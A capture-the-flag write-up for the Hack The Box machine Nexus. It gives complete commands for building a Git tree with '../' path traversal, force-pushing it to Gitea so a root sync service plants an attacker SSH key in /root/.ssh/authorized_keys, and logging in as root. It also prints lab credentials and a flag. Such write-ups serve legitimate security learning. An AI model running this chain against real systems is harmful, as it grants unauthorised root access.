# Hack The Box — Nexus

> **Platform:** Hack The Box  
> **Machine:** Nexus  
> **OS:** Linux  
> **Difficulty:** Easy/Medium  
> **Focus:** Web enumeration, Gitea, Git internals, path traversal, systemd, SSH key-based privilege escalation

---

## Table of Contents

- [Overview](#overview)
- [Attack Path](#attack-path)
- [1. Hostname Resolution](#1-hostname-resolution)
- [2. Web and Virtual Host Enumeration](#2-web-and-virtual-host-enumeration)
- [3. Credential Discovery](#3-credential-discovery)
- [4. Gitea Access](#4-gitea-access)
- [5. Understanding the Privilege Escalation](#5-understanding-the-privilege-escalation)
- [6. Generate an SSH Key Pair](#6-generate-an-ssh-key-pair)
- [7. Prepare the Template Repository](#7-prepare-the-template-repository)
- [8. Build the Malicious Git Tree](#8-build-the-malicious-git-tree)
- [9. Push the Crafted Tree](#9-push-the-crafted-tree)
- [10. Trigger the Privileged Synchronization](#10-trigger-the-privileged-synchronization)
- [11. SSH as Root](#11-ssh-as-root)
- [12. Flags](#12-flags)
- [Troubleshooting](#troubleshooting)
- [Lessons Learned](#lessons-learned)
- [Command Reference](#command-reference)

---

## Overview

Nexus is a good example of a multi-step privilege-escalation chain where the final compromise comes from combining several individually understandable behaviours:

1. Discover the exposed web applications and virtual hosts.
2. Obtain valid credentials for the `jones` account.
3. Access the Gitea instance as `jones`.
4. Abuse a repository configured as a **Template**.
5. Create a crafted Git tree containing a relative path with `../` traversal.
6. Let the privileged `gitea-template-sync.service` process that repository.
7. Use the service's privileges to place an attacker-controlled SSH public key in `/root/.ssh/authorized_keys`.
8. Authenticate to SSH as `root` with the corresponding private key.

---

## Attack Path

```text
                    ┌────────────────────────┐
                    │   Nexus web services   │
                    └────────────┬───────────┘
                                 │
                                 ▼
                    ┌────────────────────────┐
                    │   Credential discovery │
                    │      jones : password  │
                    └────────────┬───────────┘
                                 │
                                 ▼
                    ┌────────────────────────┐
                    │   Gitea repository     │
                    │       jones/test       │
                    │        Template        │
                    └────────────┬───────────┘
                                 │
                                 ▼
                    ┌────────────────────────┐
                    │ Crafted Git tree with  │
                    │ ../ traversal          │
                    └────────────┬───────────┘
                                 │
                                 ▼
                    ┌────────────────────────┐
                    │ gitea-template-sync    │
                    │ runs with root rights  │
                    └────────────┬───────────┘
                                 │
                                 ▼
                 /root/.ssh/authorized_keys
                                 │
                                 ▼
                    ┌────────────────────────┐
                    │ SSH public-key auth    │
                    │       as root          │
                    └────────────────────────┘
```

---

# 1. Hostname Resolution

The target IP was added to `/etc/hosts` so the virtual hosts could be accessed by name.

```bash
sudo sh -c 'echo "10.129.87.83 nexus.htb" >> /etc/hosts'
```

### What the command does

| Component | Explanation |
|---|---|
| `sudo` | Runs the shell command with elevated privileges. |
| `sh -c` | Executes the complete quoted command through a shell. |
| `echo` | Outputs the hostname mapping. |
| `>> /etc/hosts` | Appends the mapping to the local hosts file. |

After this, `nexus.htb` resolves locally to the target address.

---

# 2. Web and Virtual Host Enumeration

The HTTP attack surface exposed more than one virtual host. The important applications discovered during the process were:

| Host | Application | Relevance |
|---|---|---|
| `billing.nexus.htb` | Krayin CRM | Authenticated web application and file-upload testing |
| `git.nexus.htb` | Gitea | Main privilege-escalation vector |

## Burp Suite + Firefox

Firefox was configured to proxy traffic through Burp Suite. During normal browsing, **Intercept was left OFF** so requests were not blocked.

When a specific request needed to be examined, the request was inspected under:

```text
Proxy → HTTP history
```

### File-upload investigation

The Krayin account page used a multipart request similar to:

```http
POST /admin/account/update
Content-Type: multipart/form-data; boundary=...

Content-Disposition: form-data; name="image[]"; filename="Imagenes (3).png"
Content-Type: image/png
```

This confirmed that the application accepted uploaded files, but this upload endpoint was **not** the path used for the final privilege escalation.

The useful application for the privilege escalation turned out to be Gitea, not the avatar upload feature.

---

# 3. Credential Discovery

A valid credential set for the `jones` account was obtained during the enumeration/compromise phase:

```text
Username: jones
Password: y27xb3ha!!74GbR
```

These credentials provided access to the Gitea instance.

> **Lab note:** Credentials shown here belong to the Hack The Box target and are included only to document the machine workflow.

---

# 4. Gitea Access

The Gitea instance was accessed at:

```text
http://git.nexus.htb
```

The `jones` account had repository access, including a repository named `test` marked as a **Template**.

## Verify repository access

```bash
git ls-remote http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/test.git
```

### What does `git ls-remote` do?

`git ls-remote` queries a remote repository and prints the references it exposes, such as branches and tags. It does **not** clone the repository.

A previous attempt against only `/jones/` returned `repository ... not found` because that URL did not point to a specific Git repository.

## Clone the repository

```bash
git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/test.git
cd test
```

The repository was empty, which was useful because it meant the repository contents could be controlled from the attacker side.

---

# 5. Understanding the Privilege Escalation

The important service on the machine was:

```text
gitea-template-sync.service
```

Its associated systemd timer was:

```text
gitea-template-sync.timer
```

The service executed a Python synchronization script with elevated privileges. That was the trust boundary we targeted.

The core issue was that the synchronization logic handled Git paths without safely preventing `..` traversal. A crafted Git tree could therefore contain an entry such as:

```text
../../../../../root/.ssh/authorized_keys
```

If the privileged synchronization process wrote that path, the result was an attacker-controlled `/root/.ssh/authorized_keys` file.

At that point, the problem became standard SSH public-key authentication.

---

# 6. Generate an SSH Key Pair

A dedicated Ed25519 key pair was generated on the **Parrot attacker machine**.

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

### Parameter breakdown

| Option | Meaning |
|---|---|
| `-t ed25519` | Generate an Ed25519 key pair. |
| `-f /tmp/.k` | Save the private key as `/tmp/.k`. |
| `-N ''` | Use an empty passphrase. |

The command creates:

```text
/tmp/.k      ← private key
/tmp/.k.pub  ← public key
```

The private key must remain on the attacker machine. Only the public key needs to reach the target.

### Display the public key

```bash
cat /tmp/.k.pub
```

The resulting OpenSSH public-key line is the payload that ultimately needs to be written into:

```text
/root/.ssh/authorized_keys
```

---

# 7. Prepare the Template Repository

The public key was copied into the Git repository as an ordinary file first. This makes it easy to create a real Git blob containing exactly the data we want to place in `authorized_keys`.

```bash
cp /tmp/.k.pub authkey_payload
```

### Create a commit

```bash
git add authkey_payload
git commit -m "sync"
```

Git initially refused the commit because no author identity was configured. The repository-local identity was set with:

```bash
git config user.name "santana"
git config user.email "santana@parrot"
```

### Why do we need a normal commit first?

Git stores file contents as **blob objects**. By creating a regular commit, we can ask Git for the object ID of `authkey_payload` and then reuse that blob when manually building a custom tree.

### Extract the blob hash

```bash
BLOB_HASH=$(git ls-tree HEAD | awk '$4=="authkey_payload"{print $3}')
```

For this machine, the resulting blob was:

```text
ff7586854f0b8a6d905fc950df90a4b8d7352de7
```

The hash identifies the exact object containing our SSH public key.

---

# 8. Build the Malicious Git Tree

## Why `git mktree`?

Normally, Git generates valid directory trees for you. Here we need to create a deliberately unusual tree structure by hand.

One important detail discovered during the process was that this does **not** work:

```text
root/.ssh/authorized_keys
```

passed directly as a single tree entry, because `git mktree` treats `/` as invalid inside a single path component.

The correct approach is to construct the directory structure one level at a time.

## Step 1 — Create the `authorized_keys` tree

```bash
AUTH=$(printf "100644 blob %s\tauthorized_keys\n" "ff7586854f0b8a6d905fc950df90a4b8d7352de7" | git mktree)
```

This creates a tree containing:

```text
.sha/??
└── authorized_keys
```

The important part is that the Git tree now references our SSH public-key blob using the filename `authorized_keys`.

## Step 2 — Put it inside `.ssh`

```bash
SSH=$(printf "040000 tree %s\t.ssh\n" "$AUTH" | git mktree)
```

The resulting logical structure becomes:

```text
.ssh/
└── authorized_keys
```

## Step 3 — Put `.ssh` inside `root`

```bash
ROOT=$(printf "040000 tree %s\troot\n" "$SSH" | git mktree)
```

The logical structure is now:

```text
root/
└── .ssh/
    └── authorized_keys
```

## Step 4 — Add the path traversal components

The vulnerable synchronization logic resolves relative paths. We therefore wrap the `root` tree in a chain of parent-directory entries.

```bash
L1=$(printf "040000 tree %s\t..\n" "$ROOT" | git mktree)
```

```bash
L2=$(printf "040000 tree %s\t..\n" "$L1" | git mktree)
```

```bash
L3=$(printf "040000 tree %s\t..\n" "$L2" | git mktree)
```

```bash
L4=$(printf "040000 tree %s\t..\n" "$L3" | git mktree)
```

```bash
L5=$(printf "040000 tree %s\t..\n" "$L4" | git mktree)
```

The final tree is intentionally shaped so that the path resolves outside the normal repository directory.

## Verify the final tree

```bash
git ls-tree -r "$L5"
```

The important output was:

```text
100644 blob ff7586854f0b8a6d905fc950df90a4b8d7352de7    ../../../../../root/.ssh/authorized_keys
```

This is the critical point in the exploit chain: the Git tree now contains a path traversal targeting root's SSH authorization file.

---

# 9. Push the Crafted Tree

The custom tree is not automatically a commit, so a commit object was created manually.

```bash
NEW_COMMIT=$(git commit-tree "$L5" -m "payload")
```

### What does `git commit-tree` do?

It creates a Git commit object that references the tree we constructed. This allows the malicious tree to become the actual content of a branch.

## Point `main` at the malicious commit

```bash
git update-ref refs/heads/main "$NEW_COMMIT"
```

### What does `git update-ref` do?

It changes a Git reference directly. Here, it makes the local `main` branch point to our crafted commit instead of the normal commit created earlier.

## Force-push the branch

```bash
git push origin main --force
```

The push succeeded:

```text
* [new branch]      main -> main
```

A warning about `.gitattributes` and permission handling appeared during the operation, but the `main` branch was still accepted by Gitea. The important result was that the crafted tree reached the remote repository.

---

# 10. Trigger the Privileged Synchronization

The synchronization mechanism is triggered by the systemd timer:

```text
gitea-template-sync.timer
```

It activates:

```text
gitea-template-sync.service
```

The service runs the synchronization script with root privileges.

## Check the service status

From the `jones` shell on Nexus:

```bash
systemctl status gitea-template-sync
```

The relevant output showed:

```text
Active: inactive (dead)
ExecStart=... status=0/SUCCESS
Main PID: ... (code=exited, status=0/SUCCESS)
TriggeredBy: gitea-template-sync.timer
```

This confirms that the service had been triggered and completed successfully.

### HTB question

> **What systemd timer triggers the template synchronization service?**

Answer:

```text
gitea-template-sync.timer
```

---

# 11. SSH as Root

Once the synchronization job has processed the crafted tree, the attacker's public key is written into:

```text
/root/.ssh/authorized_keys
```

The private key remains on Parrot:

```text
/tmp/.k
```

The final SSH connection is therefore performed **from Parrot**, not from the `jones` shell:

```bash
ssh -i /tmp/.k root@10.129.87.83
```

### Why was the earlier SSH attempt failing?

An earlier attempt was made while already logged into Nexus as `jones`:

```bash
ssh -i /tmp/.k root@10.129.87.83
```

That machine did not contain `/tmp/.k`, so SSH reported:

```text
Identity file /tmp/.k not accessible: No such file or directory
```

SSH then fell back to password authentication.

The correct workflow is:

```text
Parrot
  │
  │  ~/.private key: /tmp/.k
  ▼
Nexus
  │
  └── root via public-key authentication
```

After connecting:

```bash
whoami
```

Expected result:

```text
root
```

---

# 12. Flags

## User flag

The user flag obtained during the compromise was:

```text
168e8047b79c65ef86f80f67f261cf47
```

It was read from the `jones` home directory with:

```bash
cat user.txt
```

## Root flag

Once root access is obtained:

```bash
cat /root/root.txt
```

---

# Troubleshooting

## `git commit` says “Author identity unknown”

Configure a repository-local identity:

```bash
git config user.name "santana"
git config user.email "santana@parrot"
```

Then run the commit again.

## `git mktree` says “path ... contains slash”

Do not pass `root/.ssh/authorized_keys` as one path component. Build nested trees:

```text
root/
└── .ssh/
    └── authorized_keys
```

## SSH asks for `root`'s password

That means public-key authentication did not succeed. Check:

1. The private key exists on Parrot.
2. The corresponding public key was successfully written to `/root/.ssh/authorized_keys`.
3. The synchronization service actually processed the malicious repository.
4. The SSH command is being executed from Parrot.

Use verbose SSH output if necessary:

```bash
ssh -v -i /tmp/.k root@10.129.87.83
```

## Firefox pages hang while using Burp

If **Intercept** is ON, Burp holds the browser request until it is forwarded. For normal browsing, use:

```text
Proxy → Intercept → OFF
```

Use **HTTP history** to inspect requests without blocking them.

## HTTP 413 Request Entity Too Large

The avatar upload initially returned:

```text
HTTP/1.1 413 Request Entity Too Large
```

This came from nginx and indicated that the HTTP request body exceeded the configured size limit. Using a smaller test image avoided that issue.

This was unrelated to the final Gitea privilege-escalation path.

---

# Lessons Learned

### 1. A file-upload endpoint is not automatically the vulnerability you need

Krayin accepted avatar uploads through `/admin/account/update`, but that was not the path used for privilege escalation. Identifying the exact endpoint and understanding the application's components mattered more than simply finding a file upload.

### 2. Git objects can be manipulated below the normal porcelain layer

Commands such as:

```bash
git mktree
 git commit-tree
 git update-ref
```

allow direct construction and manipulation of Git's internal object model. This can be useful when an application trusts repository metadata or tree paths incorrectly.

### 3. Privileged background services deserve close inspection

The vulnerable behaviour was more interesting because the Git data was processed by a systemd-managed service running with root privileges. A path-handling bug becomes a full privilege escalation when the consumer operates as root.

### 4. SSH keys turn file-write access into code-execution-like impact

Writing a public key to:

```text
/root/.ssh/authorized_keys
```

is enough to obtain a fully authenticated root shell without knowing the root password.

---

# Command Reference

## Hostname setup

```bash
sudo sh -c 'echo "10.129.87.83 nexus.htb" >> /etc/hosts'
```

## Gitea repository access

```bash
git ls-remote http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/test.git
```

```bash
git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/test.git
```

## SSH key generation

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

## Repository payload

```bash
cp /tmp/.k.pub authkey_payload
```

```bash
git add authkey_payload
git commit -m "sync"
```

```bash
BLOB_HASH=$(git ls-tree HEAD | awk '$4=="authkey_payload"{print $3}')
```

## Crafted tree

```bash
AUTH=$(printf "100644 blob %s\tauthorized_keys\n" "$BLOB_HASH" | git mktree)
```

```bash
SSH=$(printf "040000 tree %s\t.ssh\n" "$AUTH" | git mktree)
```

```bash
ROOT=$(printf "040000 tree %s\troot\n" "$SSH" | git mktree)
```

```bash
L1=$(printf "040000 tree %s\t..\n" "$ROOT" | git mktree)
```

```bash
L2=$(printf "040000 tree %s\t..\n" "$L1" | git mktree)
```

```bash
L3=$(printf "040000 tree %s\t..\n" "$L2" | git mktree)
```

```bash
L4=$(printf "040000 tree %s\t..\n" "$L3" | git mktree)
```

```bash
L5=$(printf "040000 tree %s\t..\n" "$L4" | git mktree)
```

## Verify

```bash
git ls-tree -r "$L5"
```

## Push

```bash
NEW_COMMIT=$(git commit-tree "$L5" -m "payload")
```

```bash
git update-ref refs/heads/main "$NEW_COMMIT"
```

```bash
git push origin main --force
```

## Trigger / verify synchronization

```bash
systemctl status gitea-template-sync
```

## Root SSH

```bash
ssh -i /tmp/.k root@10.129.87.83
```

```bash
whoami
```

```bash
cat /root/root.txt
```

---

## Final Summary

The root cause was a trust-boundary failure in the privileged template synchronization workflow: Git tree paths containing `../` were processed by a root-level synchronization service without sufficient path sanitization.

By creating a crafted Git tree, pushing it to the Gitea template repository, and waiting for `gitea-template-sync.timer` to trigger `gitea-template-sync.service`, it was possible to redirect a file write into `/root/.ssh/authorized_keys`.

That file contained the attacker's SSH public key, allowing direct authentication as `root` with the matching private key.

```text
Gitea Template
      ↓
Crafted Git tree
      ↓
../ path traversal
      ↓
root-owned sync service
      ↓
/root/.ssh/authorized_keys
      ↓
SSH key authentication
      ↓
ROOT
